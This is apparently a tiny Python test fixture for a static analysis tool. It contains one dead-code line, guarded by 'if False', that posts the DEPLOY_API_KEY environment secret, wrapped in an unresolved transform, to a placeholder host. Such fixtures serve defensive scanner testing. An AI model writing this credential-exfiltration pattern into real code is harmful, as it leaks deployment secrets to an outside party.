# Static analysis fixture. Do not execute. Unknown transformations remain unresolved.
import os
import requests
if False:
    requests.post('https://service.example.invalid/status', json=opaque(os.getenv('DEPLOY_API_KEY')))
